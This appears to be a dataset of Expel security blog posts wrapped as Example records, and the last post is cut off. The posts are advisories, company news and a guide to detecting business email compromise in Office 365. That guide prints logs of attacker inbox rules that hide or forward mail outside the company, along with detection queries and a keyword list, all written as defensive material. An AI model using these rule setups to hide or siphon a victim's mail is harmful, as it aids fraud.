  Example({'title': '#RSAC round 2: Expel heads back to Moscone - Expel', 'url': 'https://expel.com/blog/rsac-round-2-expel-heads-back-to-moscone/', 'date': 'Apr 18, 2023', 'contents': 'Subscribe  EXPEL BLOG #RSAC round 2: Expel heads back to Moscone Expel insider  1 MIN READ  KELLY FIEDLER  APR 18, 2023  TAGS: Cloud security / Company news / MDR / Tech tools Our bags are packed and were counting down as we prep to make our second appearance at RSA Conference (#RSAC) as exhibitors. We made a lot of noise last yearthrowback to when YouTube sensation Harry Mack freestyled from our booth on the show floorand we cant wait to return to Moscone. Were especially excited because this years theme of stronger together really hits home for us at Expel. We know were strongest when we come together as a defender community to share knowledge and lessons learned. We cant wait to talk shop with our peers, trade stories from the security operations center (SOC), and show you security that makes sense. Recent headlines (think: Silicon Valley Bank and the 3CXDesktopApp supply chain attack ) are only proof points of the increasingly complex threat landscape, meaning security teams need visibility across the cloud, Kubernetes, SaaS apps, and on-prem to keep up. Stop by our booth (S0954 in the South Hall) to see how we translate alerts into prescriptive outcomes with a software-driven approach to security operations. Fueled by our security operations platform, Expel Workbench, well show you how our managed security products leverage the tech you already have in place to make sure youre getting the most out of your existing investments. Our goal is to help customers evolve from reactive security strategies to ones that are proactive, measurable and resilient, with managed detection and response (MDR), threat hunting, phishing, and more. By the way, remember that stronger together theme? San Francisco-based artist, Bee Betwee will join us onsite to create an art installation of the many faces, backgrounds, and experiences that represent cybersecuritylive from the show floor. Head to the Expel booth on Tuesday, April 25, and Wednesday, April 26, 2-5pm, and Thursday, April 27, 10am-1pm, to watch Bee work and for the chance to become a part of the art. Want to see for yourself and meet our crew? Book a demo here to see Expel Workbench in action at the booth. We also know the exhibit hall can be loud. Schedule a one-on-one meeting right down the block at Aphotic here (just a six-minute walk from Moscone).'}) (input_keys={'title'}),
  Example({'title': 'Security alert: 3CXDesktopApp supply chain attack - Expel', 'url': 'https://expel.com/blog/security-alert-3cxdesktopapp-supply-chain-attack/', 'date': 'Mar 30, 2023', 'contents': 'Subscribe  EXPEL BLOG Security alert: 3CXDesktopApp supply chain attack Security operations  2 MIN READ  JON HENCINSKI  MAR 30, 2023  TAGS: MDR What happened? The popular voice and video conference software, 3CXDesktopApp by 3CX, was recently compromised in an apparent supply chain attack. Attackers have trojanized 3CX installers to turn them into malicious tools used in multi-stage attacks. Starting March 22, 2023, global 3CX users began reporting endpoint detection and response (EDR) quarantining of the 3CXDesktopApp for suspicious behavior. On March 29, CrowdStrike confirmed and published a report that both the Windows and MacOS versions of the application had been compromised in a supply chain attack. According to 3CX, the following versions of 3CXDesktopApp are compromised: Windows versions 18.12.407 and 18.12.416 Mac OS versions 18.11.1213, 18.12.402, 18.12.407, and 18.12.416. Why does it matter? 3CX serves more than 600,000 companies worldwide and has over 12 million daily users. Given the vast interconnectedness of the contemporary cyber landscape, the ripple from supply chain attacks like this one creates risk exposure for a massive number of organizations. Whatre we doing for our customers? First, were reviewing customer logs for evidence of attempted or successful compromise. Weve also deployed global Be-on-the-Lookout (BOLO) rules to alert when we ingest any security telemetry that contains domains or known bad hashes linked to the attack. Finally, weve reviewed all ingested alert signals going back 30 days. As we begin to observe vendor-written detections for this activity, well evaluate these as part of Expels detection methodology. Were also monitoring open source channels for updates. What should you do right now? If youre using the 3CXDesktopApp application, follow 3CX guidelines by utilizing the web application PWA instead of the desktop application. Next, implement the applicable patches and updates when appropriate and able. 3CX reports that the majority of the domains contacted by the compromised library have already been reported and taken down. However, we still recommend proactively blocking all known IOCs, check out this SecurityWeek article for reference. What can you do longer term? Plan for supply chain attacksThe term supply chain can mean different things to different organizations. For many tech companies, your supply chain is a long list of cloud services that facilitate your day-to-day business. Assume attackers target you and plan accordingly. Have plans for alternative supply chain providersWere not saying you need a hot backup for all your cloud services, but its smart to have a contingency for potentially rapid provider shifts in the event of a catastrophic hack. This should be largely in line with your business continuity plans (which youve tested, right?). Prioritize asset managementWhen you learn about a compromised major vendor or software repository, you must be able to answer, Are we impacted? quickly and accurately. Be creativeFailures of imagination are a real (and really unfortunate) thing. And it can be very difficult to dream up attacks like SolarWinds Orion or vulnerabilities like Heartbleed. When planning tabletops, ask people around your company: Whats the worst thing that could happen? You might be surprised at the scenarios others are worrying about. What next? As we outlined, were keeping a close eye on this situation as it unfolds. Well update this post with big developments, but keep an eye on our socials ( @ExpelSecurity ) for additional recommendations as they emerge.'}) (input_keys={'title'}),
  Example({'title': 'Security alert: high-severity vulnerability affecting OpenSSL ...', 'url': 'https://expel.com/blog/security-alert-high-severity-vulnerability-affecting-openssl-v3-and-higher/', 'date': 'Nov 3, 2022', 'contents': 'Subscribe  EXPEL BLOG Security alert: high-severity vulnerability affecting OpenSSL V3 and higher Security operations  2 MIN READ  AARON WALTON AND JAMES MASKELONY  NOV 3, 2022  TAGS: MDR CVE-2022-3602 &amp; CVE-2022-3786: software that uses OpenSSL 3.0.0-3.0.6 should still be upgraded to 3.0.7 as soon as it is reasonable to do so. What happened? On November 1, 2022, the OpenSSL Project released version 3.0.7 to address two vulnerabilities affecting OpenSSL version 3.0 and later that they classify as high-severity. CVE-2022-3602: X.509 Email Address 4-byte Buffer Overflow CVE-2022-3786: X.509 Email Address Variable Length Buffer Overflow OpenSSL originally categorized these vulnerabilities as critical severity before disclosing them , but they have now downgraded them after determining theyre less dangerous than initially thought. Why does it matter? OpenSSL is a widely used open-source encryption library. Its widespread adoption contributed to increased initial concern, as any critical exploit could potentially affect a large number of systems (think Heartbleed level of disruption). However, later information revealed that the affected versions (3.0.0-3.0.6) are relatively new and not as widely adopted as first thought. (When considering severity, its important to note that the definitions of critical and high used by OpenSSL are their own and dont follow standard categorizations such as the Common Vulnerability Scoring System [CVSS]. These factors are important when calculating the possible impact.) While CVE-2022-3602 could potentially lead to Remote Code Execution (RCE), the good news is there are several mitigating factors that make successful code execution fairly unlikely on affected systems. According to the OpenSSL notification , exploitation requires either that the attacker have a certificate signed by a trusted Certificate Authority (CA), or that the application would need to ignore certificate verification failures. While this isnt impossible for attackers, it means the attack takes a lot more work than we first anticipated. On top of that, most systems have a variety of existing security protections against memory attacks. These protections add a layer of complexity to achieving code execution via buffer overflow. The added constraint of only four attacker-controlled bytes further complicates any attack path. Abusing this vulnerability for RCE would require significant development and creation of a complex exploit chain. The second vulnerability, CVE-2022-3786, also abuses a basic buffer overflow and could be used to cause a denial of service (DoS) and prevent use of the software. Some attackers use DoS in attacks, but such attacks typically dont earn cash and arent as interesting and desirable. That doesnt mean attackers couldnt use it, but financially motivated attackers are less likely to rush to do so. What you should do While no longer critical, the OpenSSL team still considers these issues to be serious, and software that uses OpenSSL 3.0.0-3.0.6 should still be updated to 3.0.7 as soon as is reasonable. If you have further questions about this vulnerability or any other threat to your cybersecurity environment, please contact us. Sidebar: this event serves as a great reminder that patching and updating software regularly can help prevent attacks. It might seem obvious to security professionals, but vendors are constantly plugging security holes and patching bugs. Ignoring upgrade notifications might be convenient now, but it could cost organizations down the line.'}) (input_keys={'title'}),
  Example({'title': 'Security for the other 99 percent - Expel', 'url': 'https://expel.com/blog/security-for-the-other-99-percent/', 'date': 'Apr 10, 2018', 'contents': 'Subscribe  EXPEL BLOG Security for the other 99 percent Expel insider  3 MIN READ  DAVE MERKEL  APR 10, 2018  TAGS: Announcement / Company news / Mission Every time I read the words RedThreatStormDoom, the market leading provider of cybersecurity next-gen whatnots, announced it has secured seventy-flabillion dollars in series Q financing  I jump for joy. The thought of more widgets for massive security organizations that can create yet more categories of spend in their ever expanding budgets warms the cockles of my heart (which are technically the ventricles). OK, no, it actually doesnt warm anything. I sort of sigh in exasperation. Ysee, while there is great innovation coming from entrepreneurs, its frequently focused on solving problems for elite security organizations  or at the very least elite security spenders. Security one-percenters, if you will. Maybe thats too cynical. But the reality is that much of the innovation coming out of security vendors today can only be effectively employed by security one-percenters, regardless of how much the vendor thinks everyone should (or can) use their product. Why is that? Two primary reasons: budget realities and people. First, security budgets are finite . Unless youre a top-tier bank its unlikely your spend is increasing every year. You probably dont buy one of everything. And even if you do, its highly unlikely youve got the people youd need to get the value out of all those widgets. People are expensive  whether youre talking salaries or the opportunity cost of keeping them happy or dealing with the times you fail to keep them happy. And if youre looking to have 247 operations you can multiply that expense yet again. But what about the AIs? you might ask. Arent they supposed to get those pesky humans out of the loop? Well sure  but only if you embed them in a blockchain. And name your company blockchain.ai. THEN you might be on to something. (How sad is it that I just typed blockchain.ai into my browser to make sure it wasnt a thing because in this day and age you cant be sure?). OK, fine, lets actually deal with that. What about the AIs? A variety of advances in computer science, including AI, machine learning techniques, etc., can help us. But its not going to eliminate people any time soon. Improvements that come from the AIs and MLs will increasingly augment the human decision maker. Ergo, my prior comments regarding one-percenters and the expense of keeping the brains in the loop happy. With that overlong preamble, Im pleased to announce Expel, the nowhere-near-market-leading (yet  because were a 20 month old start-up) provider of transparent managed security has secured $20 million in series B financing, led by Scale Venture Partners, and joined by all of our existing (and fantastic) supporters at Battery Ventures, Greycroft, Lightbank, NEA, Paladin Capital Group and Profile Capital Management. Why am I pleased? Because increasingly were finding people of like mind that agree with our view of the world: the biggest gap in the information security market isnt a lack of interesting, innovative technology to generate security signal in your (endpoint, network, cloud) infrastructure. Its an inability to turn that into something you can action at a realistic, predictable cost. Hiring your way out of the problem isnt going to work for most organizations, and you cant buy a magic AI-in-a-box to make the problem go away. So what are the other 99 percent supposed to do? The logical answer is go get yourself a managed security service provider (MSSP). But we think that markets in flux . On one hand you have the legacy MSSP providers, long in the tooth, mired in old technologies and processes, slogging through alerts with hordes of analysts stacked up like a cord of wood in a SOC. On the other hand, youve got niche managed offerings  often referred to as managed detection and response (MDR)  focused on specific managed security use cases and technologies. While some of these solutions provide value, they still operate as a black box. Its hard to know whats happening behind the curtain (in their SOC). Nobody is going after the whole solution and no one is using your existing security investments to provide a transparent managed offering that delivers answers  not just alerts. Here at Expel were trying to fix that. And this new investment will help us do it a bit faster. Now, in the spirit of ending with an executable  something you can go away and do without writing a check  take a look at this post from our CISO , Bruce Potter (we say it SEE-so, mostly to annoy Bruce). It shows how you can use the NIST Cybersecurity Framework to evaluate and visualize where youre at and where you want your security program to go. It includes some tips and a self-scoring Excel spreadsheet that lets you use the NIST CSF in a common sense way. It also speaks to what Expel provides in a CSF context. If youre thinking to yourself thats nice you got funding and all, but what specific impact will you have on my environment this provides the answer.'}) (input_keys={'title'}),
  Example({'title': 'Security PSA: SVB collapse presents ripe opportunity for ...', 'url': 'https://expel.com/blog/security-psa-svb-collapse-presents-ripe-opportunity-for-counterparty-fraud/', 'date': 'Mar 16, 2023', 'contents': 'Subscribe  EXPEL BLOG Security PSA: SVB collapse presents ripe opportunity for counterparty fraud Security operations  2 MIN READ  GREG NOTCH  MAR 13, 2023  TAGS: MDR Blog updated on March 16 What happened? Following the collapse of Silicon Valley Bank (SVB) and the resulting uncertainty throughout the banking sector, many vendors and suppliers will be updating their banking information. Accounts receivable (AR) departments will reach out to accounts payable (AP) departments with new routing and account numbers at a much higher volume than usual. Why does it matter? An increased volume of bank account switching presents a massive opportunity for payment counterparty fraud. If an attacker is able to deceive someone into altering a few account and routing numbers, they can direct money to themselves, rather than your vendor or into your own accounts. Often this begins with compromised or forged emails resulting from business email compromise (BEC). Depending on the size of your environment, this may go unnoticed for some time. By the time you detect the attack, you could be out a significant amount of moneyand youll still owe your vendor. Whatre we doing? At this time, weve begun to see SVB-themed phishing submissions. Expel has created several YARA detections to identify phishing attacks affiliated with SVB and is assessing new detections for both our phishing and managed detection and response (MDR) offerings. What should you do right now? Validate account changes with known contacts at the counterparty where possible. Dont do this via email if it can be avoided (in case either your email or the other partys is compromised). Confirm receipt of a test deposit of a nominal value prior to making a bank account change for your vendor. This takes a bit more effort, but theres little doubt fraudsters will try to take advantage of the turmoil. What can you do longer term? BEC isnt new. It accounted for over half of all cyber incidents last year (according to our annual threat report ), and remains the top threat facing our customers. We also saw threat actors targeting human capital management systemsspecifically, Workdaywith the goal of payroll and direct deposit fraud. Situations like whats happening with SVB only exacerbate the opportunity for bad actors to exploit people as they scramble to ensure their finances are protectedand prevention starts with proper training. Make sure employees are trained to recognize potential red flags associated with phishing emails. Spend time educating specific business units about the phishing campaigns that might target them. In this example, finance teams might encounter financial-themed campaigns with subject lines such as URGENT:INVOICES or bank change (and they may even reference SVB directly). Once employees know what to look for, make it easy for them to report any suspicious activity. We recommend implementing a system for employees to validate suspicious emails or texts, allowing IT to provide guidance to the individual and giving security teams enough insight to identify trends that might indicate a larger scale attack early on. These trainings can mean an investment up-front, but theyll pay dividends in the long run. What next? With the collapse of SVB, theres always the potential for further turmoil within the banking industry (we also saw the shuttering of Signature Bank over the weekend). As these events unfold, well continue working with our customers to help protect them from bad actors looking to exploit the situation. By the way, not an Expel phishing customer and think youd like to be? Reach out .'}) (input_keys={'title'}),
  Example({'title': 'Signs of Business Email Compromise (BEC) Phishing ...', 'url': 'https://expel.com/blog/seven-ways-to-spot-business-email-compromise-office-365/', 'date': 'Feb 14, 2019', 'contents': 'Subscribe  EXPEL BLOG Seven ways to spot a business email compromise in Office 365 Tips  10 MIN READ  JON HENCINSKI  FEB 14, 2019  TAGS: Cloud security / Get technical / How to / Managed security / SOC Remember the old days when all of those Nigerian princes were emailing you to offer giant sums of money? All youd need to do, of course, was click that suspicious-looking link, share your bank account information and youd be living large. (Finally, a good reason to stop buying all those Powerball tickets.) That scam is the old school version of a type of attack called a business email compromise (BEC). While those generous Nigerian princes have long since vanished, BEC has gotten far more sophisticated over the years, turning even the savviest internet users into unwitting victims. As attackers behind BEC attacks find ever more clever tactics to use, its getting trickier for businesses to protect themselves. But there are some telltale signs you can look for that are tip-offs that somethings amiss. What is business email compromise (BEC)? First things first, though. Youve got to know what youre looking for. Business email compromise (BEC) is a sophisticated, email-based scam targeting organizations and individuals just about everywhere. Many people think that BEC is only associated with wire transfer fraud, but the reality is that BEC is much more than that . Its really an umbrella term that includes things like W2 scams , romance scams , real estate scams and lottery scams . Youre probably sitting there thinking, Do people really fall for these tricks? They sure do. And it happens more often than you think. In fact, between October 2013 and May 2018 , there were 78,617 domestic and international BEC incidents, with victims from over 150 countries and all 50 U.S. states. BEC fraud has become so widespread that its now the target of major international law enforcement efforts coordinated domestically and abroad by organizations like the FBI and U.S. Department of Justice. Just this past summer, a BEC takedown effort named Operation WireWire resulted in 74 arrests globally, including 42 in the U.S. They nabbed nearly $2.4 million and recovered approximately $14 million in fraudulent wire transfers. Now for the good news: There are ways that you can spot BEC attacks and stop them before they compromise unsuspecting employees. Three common categories of BEC scams 1. CEO Impersonation During a CEO fraud scam, the hacker will impersonate the CEO or another executive at the org in an attempt to trick any level of employee to divulge private information. These requests can range from sending confidential client information or tax information via email to executing wire transfers that are not authorized. In some cases, these schemes can be spear-phishing attacks where an employee is convinced to download a file or software onto a work computer. 2. Full Account Takeover One of the biggest goals for a cyberattacker is full takeover. This category of BEC scams can be the most devastating. Interestingly, a report from IDG Communications found that more than 56 percent of orgs reported falling victim to a breach caused by their vendor. 3. False Invoice Scheme False invoice schemes typically target a member of the financial or accounting department. More experienced cyberattackers will alter a legitimate invoices bank account numbers but leave the rest of the document unchanged, making it very challenging to notice the invoice is fake. From there, the possibilities are endless. Some attackers increase the payment amount or create a double payment, among many other common hacking techniques. How to spot (and alert on) BEC activity Through the Expel SOCs investigate work responding to many BEC activities in Office 365 (O365), weve observed threat actors reusing certain techniques to gain and maintain access to victims mailboxes. Take a look at this example of a recent investigation where a threat actor used BEC to access a victims mailbox and then set up mailbox Inbox rules to redirect any emails that contained the words statement, outstanding, pastdue, payment, invoice or wire to a Gmail account. Here are some common hallmarks of crafty BEC attacks, that our own SOC analysts here at Expel have detected in the last few months by using the Expel Workbench. Were going to share some of the techniques that we see attackers using again and again so you can take steps to protect your own org. As a bonus, well even share log samples and example SIEM queries (were using Sumo Logic ) if you want to query your own tools for related activity. Plus were sharing our perspective on how likely you are to get false positives from these rules. Youll probably notice that theres a theme to these often-used attacker techniques: the creation of new mail inbox rules. Why are we focusing so much on inbox rules? Because the attackers running these scams generally create inbox rules to hide evidence from their victims that the victims mailbox is being used to perpetuate those clever BEC activities. The good news is that since attackers use this tactic so often, it creates a great detection opportunity, because there are only so many rules an attacker can create to cover his or her tracks. As you look for evidence of BEC attempts, you should be alerting on: 1. Inbox rules to automatically forward emails to any of the following folders: RSS subscriptions, junk email or notes During a recent investigation, we detected a threat actor creating an inbox rule to automatically forward emails containing WeTransfer in the email subject or body to the RSS subscriptions folder of the victims mailbox. Log example: "Operation":"New-InboxRule", "RecordType":1, "ResultStatus":"True", "UserType":2, "Version":1, "Workload":"Exchange", " { "Name":"AlwaysDeleteOutlookRulesBlob", "Value":"False" },{ "Name":"Force", "Value":"False" },{ "Name":"MoveToFolder", "Value":"RSS Subscriptions" },{ "Name":"Name", "Value":".." },{ "Name":"SubjectOrBodyContainsWords", "Value":"WeTransfer" },{ "Name":"MarkAsRead", "Value":"True" },{ "Name":"StopProcessingRules", "Value":"True" }], Sumo Logic query example: (""New-InboxRule"" OR ""Set-InboxRule"") AND "Name":"MoveToFolder", "Value":"RSS Subscriptions"" Expected false positive rate: Low (In our world, low means that you can enter this into an alert management workflow with minimal tuning work required.) 2. Inbox rules to automatically delete messages Similar to folder redirection, weve detected threat actors creating new inbox rules to silently drop any emails that contained words like virus, hacked, hack, spam or request in the email subject or body. You can start by creating an alert for the creation of inbox rules to automatically delete messages with keywords, but we recommend alerting on any new inbox rule thats designed to automatically delete messages. Log example: "Operation":"New-InboxRule", "Parameters":[{ "Name":"AlwaysDeleteOutlookRulesBlob", "Value":"False" },{ "Name":"Force", "Value":"False" },{ "Name":"SubjectOrBodyContainsWords", "Value":"virus;hacked;hack;spam;request" },{ "Name":"DeleteMessage", "Value":"True" },{ "Name":"MarkAsRead", "Value":"True" },{ "Name":"StopProcessingRules", "Value":"True" }] Sumo Logic query example: (""New-InboxRule"" OR ""Set-InboxRule"") AND "Name":"DeleteMessage", "Value":"True"" False positive rate: Low 3. Inbox rules to redirect messages to an external email address Using this technique, the message isnt delivered to the original recipients and no notification is sent to the sender or the original recipients. Weve detected threat actors creating inbox rules to redirect emails that contained words like statement, outstanding, past due, payment, invoice or wire to email accounts outside of the organizations domain (for example, a Gmail account). Log example: "Operation": "New-InboxRule", "Parameters": "[rn {rn "Name": "AlwaysDeleteOutlookRulesBlob",rn "Value": "False"rn },rn {rn "Name": "Force",rn "Value": "False"rn },rn {rn "Name": "RedirectTo",rn "Value": "&lt;redacted&gt;@gmail.com"rn },rn "Name": "SubjectOrBodyContainsWords",rn "Value": "statement;outstanding;past due;payment;invoice;wire"rn },rn {rn "Name": "StopProcessingRules",rn "Value": "True"rn }rn]", Sumo Logic query example: (""New-InboxRule"" OR ""Set-InboxRule"") AND "Name":"RedirectTo"" False positive rate: This alert is susceptible to false positives since its not uncommon for users to forward work-related emails to a personal webmail account. If youve integrated O365 with your SIEM, modify the query or rule set to alert and filter out known false positives. 4. Inbox rules that contain BEC keywords Youre probably starting to see a theme emerge in these first three examples: using keywords to redirect emails. Weve detected threat actors by alerting anytime we see any inbox rule created using a value in our BEC keyword list. Heres a snippet of our own BEC keyword list to get you started: Virus Dropbox Password Fraud W2 Invoice Docusign Deposit Wire Tax Postmaster Utilpro Payroll Sumo Logic query example: (""New-InboxRule"" OR ""Set-InboxRule"") AND ("wetransfer" OR "document" OR "invoice" OR "postmaster") False positive rate: Low 5. New mailbox forwarding to an external address This technique doesnt involve inbox rules. Instead, it watches for wiley attackers who are configuring an external email address in the victims account settings menu. While the setup is a bit different, the intent is the same: the attacker is trying to hide evidence from the victim that his or her mailbox is being used to perpetuate BEC fraud. Log example: "Operation":"Set-Mailbox",{"Name":"ForwardingSmtpAddress","Value":"smtp:&lt;redacted&gt;"},{"Name":"DeliverToMailboxAndForward","Value":"True"}],"application-action":"Set-Mailbox","triggered-by":{"app-username":",&lt;redacted&gt;","privileges":[{"level":"admin"}],"new-values":{"additional-properties":{"DeliverToMailboxAndForward":"True"},"forward-to-address":"smtp:&lt;redacted&gt;" Sumo Logic query example: (""New-InboxRule"" OR ""Set-InboxRule"" OR ""Set-Mailbox"") AND "Name":"DeliverToMailboxAndForward"" False positive rate: This alert is also susceptible to false positives since its not uncommon for users to forward work-related emails to a personal webmail account. If youve integrated O365 with your SIEM, modify the query or rule set to alert and filter out known false positives. 6. New mailbox delegates This rule looks for threat actors that are gaining access to a victims account through mailbox delegate access rights. Take a look at this example of a potential BEC threat we detected for one of our customers just last week that involved suspicious mailbox permissions: Log example: {"Name":"AccessRights","Value":"FullAccess"},{"Name":"InheritanceType","Value":"All"}]"application-action":"Add-MailboxPermission","status":{"code":"Success"} Sumo Logic query example: ("Add-MailboxPermission") AND "Name":"AccessRights"" AND "Value":"FullAccess"" False positive rate: This alert is also susceptible to false positives as its not uncommon for organizations to enable access to the mailbox and calendar of high ranking employees to schedule meetings and travel. Youll need to tune this to your environment a bit. 7. Successful mailbox logins within minutes of denied logins due to conditional access policies Through O365 and Azure AD, you can implement conditional access policies to deny logins based on conditions like source country, source IP address or a sign-in risk score calculated on the backend by Microsoft. One very important detail: conditional access policies are enforced after the first-factor of authentication. Heres what it looks like in Expel Workbench: In the example above, O365 recorded a failed login from a foreign country due to a conditional access policy. Unfortunately, this can be bypassed using a virtual private network (VPN) service provider. Take a look at this example from a recent investigation where a threat actor circumvented conditional access policies by simply turning on their VPN. At 22:17:40 UTC, O365 logs recorded a login failure due to a conditional access policy set to deny authentications from a list of foreign countries. Minutes later at 22:22:40, O365 logs recorded a successful login to the same account from a popular virtual private network service provider. If youre sending O365 logs to your SIEM or have a way to implement time-based detections, fire an alert when O365 records a successful login within minutes of a failed login due to conditional access policies for the same account. Another option is to fire an alert when O365 records a successful login originating from a virtual private network service provider within minutes of a failed login due to conditional access policies for the same account. If you dont have an easy way to do this, start by reviewing alerts for failed logins due to any existing conditional access policies to get a better understanding of whats going on in your environment. You found a lead. Now what? If you identify something that doesnt look quite right, here are some investigative tips to help you chase down a potential lead into BEC activity: Identify the source of the activity Whether youre chasing down a suspicious mailbox Inbox rule or a usual email delegate, identify the source IP address associated with the successful authentication into the account when the activity in question occurred. Next, look up the additional information about the IP address, such as categorical and location information. This will allow you to understand if the IP address in question associated with an internet service provider (ISP) in your organizations geographic area or if the IP address in question is part of a VPN service provider range or located in another country based on GeoIP records. Review login activity for the user Next, review 30 days worth of login activity for the user in question. This research will help you determine if the user typically logs in to O365 from the IP address in question. Also, review user-agent activity to understand typical operating system and browser combinations. If youre chasing something down that doesnt pass the smell test, do you suddenly see a login from an odd IP address using a version of Google Chrome running on Windows when the user normally logs in from a fixed ISP line using a version of Chrome on macOS? Establish a sense of what normal looks like and watch out for deviations. We follow this same approach when pursuing leads into suspicious O365 activity in Expel Workbench where we can take advantage of automation to speed things up a bit. Take a look at this example where, with the help of some automation, were able to quickly review 30 days of login activity based on IP address and user-agent combinations. Review mailbox activity for the user This is a really good step if your initial lead into possible BEC activity was something like a suspicious login to an account that originated from a VPN service provider. If you already have O365 mailbox auditing enabled , review mailbox activity for the user and be on the lookout for the threat actor techniques we mentioned above. Dont be afraid to review 30 days worth of mailbox activity. Does the user account in question typically delegate mailbox permissions or create inbox rules to help manage their email? Context matters. Review login activity for the IP address The next step is to review 30 days worth of login activity for the IP address in question. Do you see successful authentications into multiple accounts from the IP address? Or do you only see activity into the user account in question? By reviewing login activity from the IP address in question, youre gaining greater context. This is also a valuable scoping action if the threat actor is accessing multiple accounts from the same IP address. Scope and pivot! Finally, through the investigative process you might establish new leads into BEC activity like a new external IP address used to authenticate into victim mailboxes or an inbox rule configured to silently drop any emails containing the word document. Make sure to pursue them to properly scope the activity. Lets say that through scoping you observed a BEC threat actor authenticate into a victims mailbox from a popular VPN service provider. With this knowledge in hand, set out to answer how many other accounts the threat actor accessed from the VPN service provider. Heres another example: if you know the threat actor is creating inbox rules to silently drop messages, figure out if O365 logs recorded similar activity for any other account. And if you find new leads through that? Pursue them! How do I get started? To take advantage of the alerting opportunities based on the different scenarios we described above, here are a couple #protips to get started: Enable mailbox auditing in O365. Microsoft is in the process of enabling mailbox auditing by default across all its business users, but it doesnt hurt to double check that mailbox auditing within your organization is enabled. Youll gain visibility into mailbox login activity and actions typically performed in BEC attacks. Not sure how to enable mailbox auditing? Just follow these easy instructions. Integrate O365 with your SIEM. This step allows your team to centralize alerts coming from O365, integrating them into the same workflow youre already using. Here are step-by-step instructions on integrating O365 with your SIEM. Or we could totally just do all of this for you if youre looking for an easy button. Have more questions about BEC? You can always drop us a note  wed love to chat.'}) (input_keys={'title'}),
  Example({'title': 'So long, 2022! Our year in review', 'url': 'https://expel.com/blog/so-long-2022-our-year-in-review/', 'date': 'Dec 30, 2022', 'contents': 'Subscribe  EXPEL BLOG So long, 2022! Our year in review Engineering  1 MIN READ  ANDY RODGER  DEC 30, 2022  TAGS: Careers / Cloud security / Company news / MDR / Tech tools We can hardly believe were about to close the books on 2022 and ring in the new year. While were hopeful and excited about what 2023 has in store for Expel, we cant help but reflect on the last 12 months, and warmly reminisce about all we accomplished. So to mark the end of one chapter and welcome the next, weve curated some of our favorite blog posts over the last year to share with you, our loyal readers. Enjoy! Findings and predictions from our SOC Expel Quarterly Threat Report Q3: Top 5 takeaways Top 5 takeaways: Expel Quarterly Threat Report Q2 Expel Quarterly Threat Report: Cybersecurity data, trends, and recs from Q1 2022 Great eXpeltations 2022: Cybersecurity trends and predictions Incident reports and emerging threats Emerging Threats: Microsoft Exchange On-Prem Zero-Days Incident report: how a phishing campaign revealed BEC before exploitation Emerging Threat: BEC Payroll Fraud Advisory Incident report: Spotting an attacker in GCP Incident report: From CLI to console, chasing an attacker in AWS Getting to know us The Zen of cybersecurity culture Watch out EMEAhere we come Its official: were a Great Place to Work A year in review: An honest look at a developers first 12 months at Expel Lets talk compensation: Why Expel made the move to pay transparency Useful resources Touring the modern SOC: where are the dials and blinking lights? An Expel guide to Cybersecurity Awareness Month 2022 Detection and response in action: an end-to-end coverage story A defenders MITRE ATT&amp;CK cheat sheet for Google Cloud Platform (GCP) Helpful tools for technical teams to collaborate without meetings Product information, updates, and improvements 45 minutes to one minute: how we shrunk image deployment time Understanding role-based access control in Kubernetes Remediation should be automatedand customized How Expels Alert Similarity feature helps our customers Cutting Through the Noise: RIOT Enrichment Drives SOC Clarity To get notifications when we publish new blog posts, go ahead and hit that green Subscribe button below. Youll be glad you did! Happy New Year!'}) (input_keys={'title'}),
  Example({'title': "So you're a manager. Congrats! Now what?", 'url': 'https://expel.com/blog/youre-a-manager-now-what/', 'date': 'Jul 14, 2020', 'contents': 'Subscribe  EXPEL BLOG So youre a manager. Congrats! Now what? Talent  4 MIN READ  LAURA KOEHNE  JUL 14, 2020  TAGS: Career / Employee retention / Great place to work / How to / Management Weve all been there. Your boss tells you she thinks youre ready to manage a few people on the team. Hooray! Youve been waiting for this day for ages! But when all the congratulatory high-fives subside, theres just one problem: you have exactly zero tools in your toolbox to help you be a manager. Where do you even start? Management at Expel: our $0.02 This scenario happens far too often. Youre deemed a manager and then thrown into the deep end of the management pool  with no life jacket. Youre given no tips, tricks or resources to help you figure out how the heck to actually be a good manager. Plenty of us here at Expel experienced this scenario in our past professional lives. In the absence of real guidance from former managers and HR teams, we splashed along trying our best to figure out that whole management thing on our own. This is precisely why we decided to do management differently at Expel, and approach the process of becoming a manager in a much more intentional and thoughtful manner. Heres the thing: if you do your job as a manager well, not only will you achieve results for the company, someone will hopefully remember you as a person who changed their life in ways they never expected. And youll show them how to be a great manager for someone else. Remember that your efforts will have a positive ripple effect on others. If that doesnt make it worthwhile to be an intentional manager, I dont know what does. We feel great management is paramount to making the employees journey as successful as possible. A managers habits  the thousand little everyday decisions  are what matter most to employees. This is where culture becomes reality. So whats our $0.02 on management? Invest in training managers. We believe managers are critical in scaling culture  not only in the way we grow our business but in the way we keep Expel true to who we are. Three ways were BUILDing great managers A few months ago, we kicked off a new program at Expel designed to BUILD great managers and give them the support they need to become the leaders that others remember fondly. We turned BUILD into an acronym, which became the name of this effort: Building Up Intentional Leaders Daily. And thats exactly what we ask of every manager at Expel, from a first timer to a seasoned execuwonk: be intentional about management. Commit to a habit of learning, practicing and getting better every day. We know people management is hard. Becoming a great manager isnt something that happens overnight  its a lifelong journey. So we created a program to support each manager on the path, the Expel way. Our manager program is made of three components that provide opportunities for continued conversations and skills building. While becoming a manager at Expel isnt a linear path, here are experiences you can look forward to: First  The Making of a Manager book club: A book club?! Yeah, a book club. But not the kind your grandma goes to with her bridge group. To start our 2020 program, we gave our people managers copies of The Making of a Manager by Julie Zhuo. Managers divided into groups to discuss what they took away from the book, reading a few chapters each week. Hearing what other leaders are doing in their teams and being honest with each other about whats working well (and whats not) was beneficial, and helped us all build connections across the org as we prepared to level up our management skills. After we finished the book, we were thrilled to have Julie Zhuo join us for a Zoom chat to answer all our questions and talk more about the ins and outs of management. Our whole company was invited because every Expletive needs to know what being a great manager looks like at Expel so that we can all hold our managers accountable and support them in this learning. Every new manager we promote or hire receives a manager box that includes a copy of The Making of a Manager . This book is foundational for our journey. Then  Monthly Manager Habits: At Expel we identified 12 manager habits that, when done well and consistently, help us become better managers, better coworkers and more aligned with our company values. Each month we collectively explore a single topic  an essential Expel manager habit  giving each other ideas on how to apply those habits with our own teams. We work on these skills independently every week, coming together in a two-hour online workshop mid-month to pressure test our learning. Servant leadership is a core tenet at Expel. All of our manager habits are understood through the lens of how they help us better serve others. So, new managers attend our Serve Others workshop as a gateway into the BUILD program. After attending the workshop, a new manager can jump into the next months habit. Over the course of a year, they will build their skills and experiences in each of the 12 habits. Coupled with  Leadership coaching: Books and workshops are a solid start to building our collective management skills, but something we feel is important to our leaders is the opportunity to work directly with a leadership coach for more personalized advice. For a full year while in the BUILD program, 